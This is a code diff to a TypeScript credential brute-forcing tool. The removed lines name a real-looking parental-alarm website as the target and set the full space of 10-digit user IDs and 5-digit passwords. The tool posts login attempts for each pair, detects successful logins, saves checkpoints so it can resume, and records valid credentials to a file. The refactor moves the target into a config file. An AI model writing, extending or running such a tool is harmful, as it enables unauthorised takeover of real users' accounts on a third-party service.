@@ -1,25 +1,18 @@
 import axios, { AxiosInstance, AxiosResponse } from "axios";
-import * as cheerio from "cheerio";
 import * as fs from "fs";
 import * as path from "path";
+import { loadConfig, type BruteforceConfig } from "./config";
+import {
+  type CheckpointData,
+  type CredentialPair,
+  parseCheckpoint,
+  serializeCheckpoint,
+} from "./checkpoint";
+import { isLoginSuccess } from "./loginSuccess";
 
-// Configuration
-const BASE_URL = "https://parentsalarmapp.com";
-const LOGIN_URL = `${BASE_URL}/`;
-const USER_FIELD = "LoginId";
-const PASS_FIELD = "LoginPassword";
-const SUBMIT_FIELD = "command";
-const SUBMIT_VALUE = "SIGN IN";
-
-const TIMEOUT = 15000; // 15 seconds
-const REQUEST_DELAY = 200; // 0.2 seconds
+const TIMEOUT = 15000;
+const REQUEST_DELAY = 200;
 const MAX_RETRIES = 3;
-
-// ID and Password ranges
-const ID_START = 1000000000;
-const ID_END = 9999999999; // All 10-digit IDs
-const PASS_START = 11111;
-const PASS_END = 99999; // All 5-digit passwords
 
 // File paths
 const BASE_DIR = path.dirname(__dirname); // Go up one level from src/ to nodejs/ root
@@ -27,30 +20,20 @@ const BASE_DIR = path.dirname(__dirname); // Go up one level from src/ to nodejs
 const CHECKPOINT_FILE = path.join(process.cwd(), "checkpoint.json");
 const CREDENTIALS_FILE = path.join(process.cwd(), "valid_credentials.txt");
 
-interface CredentialPair {
-  userId: string;
-  password: string;
-}
-
-interface CheckpointData {
-  currentUserId: number;
-  currentPassword: number;
-  totalTested: number;
-  foundCredentials: CredentialPair[];
-  lastUpdated: string;
-}
-
 class CredentialTester {
+  private readonly cfg: BruteforceConfig;
   private axiosInstance: AxiosInstance;
   private foundCredentials: CredentialPair[] = [];
   private totalTested = 0;
 
-  // State management
-  private currentUserId = ID_START;
-  private currentPassword = PASS_START;
+  private currentUserId: number;
+  private currentPassword: number;
   private isRunning = true;
 
-  constructor() {
+  constructor(cfg: BruteforceConfig) {
+    this.cfg = cfg;
+    this.currentUserId = cfg.idStart;
+    this.currentPassword = cfg.passStart;
     this.axiosInstance = axios.create({
       timeout: TIMEOUT,
       headers: {
@@ -71,9 +54,9 @@ class CredentialTester {
     if (fs.existsSync(CHECKPOINT_FILE)) {
       try {
         const dataRaw = fs.readFileSync(CHECKPOINT_FILE, "utf-8");
-        const data: CheckpointData = JSON.parse(dataRaw);
-        this.currentUserId = data.currentUserId ?? ID_START;
-        this.currentPassword = data.currentPassword ?? PASS_START;
+        const data = parseCheckpoint(dataRaw);
+        this.currentUserId = data.currentUserId ?? this.cfg.idStart;
+        this.currentPassword = data.currentPassword ?? this.cfg.passStart;
         this.totalTested = data.totalTested ?? 0;
         this.foundCredentials = data.foundCredentials ?? [];
 
@@ -95,7 +78,7 @@ class CredentialTester {
       lastUpdated: new Date().toISOString(),
     };
     try {
-      fs.writeFileSync(CHECKPOINT_FILE, JSON.stringify(data, null, 4));
+      fs.writeFileSync(CHECKPOINT_FILE, serializeCheckpoint(data));
     } catch (error: any) {
       console.error(`Error saving checkpoint: ${error.message}`);
     }
@@ -143,18 +126,16 @@ class CredentialTester {
     for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
       try {
         // Get login page to refresh session/CSRF
-        await freshInstance.get(LOGIN_URL);
+        await freshInstance.get(this.cfg.loginUrl);
 
-        // Prepare payload
         const payload = new URLSearchParams({
-          [USER_FIELD]: userId,
-          [PASS_FIELD]: password,
-          [SUBMIT_FIELD]: SUBMIT_VALUE,
+          [this.cfg.userField]: userId,
+          [this.cfg.passField]: password,
+          [this.cfg.submitField]: this.cfg.submitValue,
         });
 
-        // Send login request
         const response: AxiosResponse = await freshInstance.post(
-          LOGIN_URL,
+          this.cfg.loginUrl,
           payload,
           {
             headers: {
@@ -166,21 +147,14 @@ class CredentialTester {
         // Check for successful login by looking at the final URL or content
         const resUrl =
           response.request?.res?.responseUrl || response.config?.url || "";
-        if (resUrl.includes("mobiledashboard")) {
-          return true;
-        }
-
-        if (response.data && typeof response.data === "string") {
-          if (
-            response.data.includes("mobiledashboard") ||
-            response.data.includes("dashboard") ||
-            (response.status === 200 && !response.data.includes("login"))
-          ) {
-            return true;
-          }
-        }
-
-        return false;
+        const body =
+          typeof response.data === "string" ? response.data : undefined;
+        return isLoginSuccess(
+          resUrl,
+          body,
+          response.status,
+          this.cfg.successMarkers,
+        );
       } catch (error: any) {
         if (attempt < MAX_RETRIES - 1) {
           await this.sleep(REQUEST_DELAY * 2);
@@ -213,15 +187,15 @@ class CredentialTester {
     console.log(`Saving found keys to: ${path.basename(CREDENTIALS_FILE)}`);
     console.log("=".repeat(60) + "\n");
 
-    const totalCombinations =
-      (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1);
+    const { idStart, idEnd, passStart, passEnd } = this.cfg;
+    const totalCombinations = (idEnd - idStart + 1) * (passEnd - passStart + 1);
 
     // Main Loop
     // We start from currentUserId.
     // For the *first* user (currentUserId), we start from currentPassword.
     // For all subsequent users, we start from PASS_START.
 
-    for (let userId = this.currentUserId; userId <= ID_END; userId++) {
+    for (let userId = this.currentUserId; userId <= idEnd; userId++) {
       if (!this.isRunning) break;
 
       const userIdStr = userId.toString();
@@ -229,11 +203,11 @@ class CredentialTester {
 
       // Determine starting password for this user
       const startPass =
-        userId === this.currentUserId ? this.currentPassword : PASS_START;
+        userId === this.currentUserId ? this.currentPassword : passStart;
 
       console.log(`Testing User ID: ${userIdStr} | Start Pass: ${startPass}`);
 
-      for (let password = startPass; password <= PASS_END; password++) {
+      for (let password = startPass; password <= passEnd; password++) {
         if (!this.isRunning) break;
 
         // Update state
@@ -270,7 +244,7 @@ class CredentialTester {
         await this.sleep(REQUEST_DELAY);
       }
 
-      this.currentPassword = PASS_START; // Reset for save safety
+      this.currentPassword = passStart;
 
       if (userFound) {
         console.log(`\nFinished User ID: ${userIdStr} (Found Credentials)`);
@@ -293,7 +267,8 @@ class CredentialTester {
 }
 
 async function main(): Promise<void> {
-  const tester = new CredentialTester();
+  const cfg = loadConfig();
+  const tester = new CredentialTester(cfg);
 
   // Handle Ctrl+C
   process.on("SIGINT", () => {
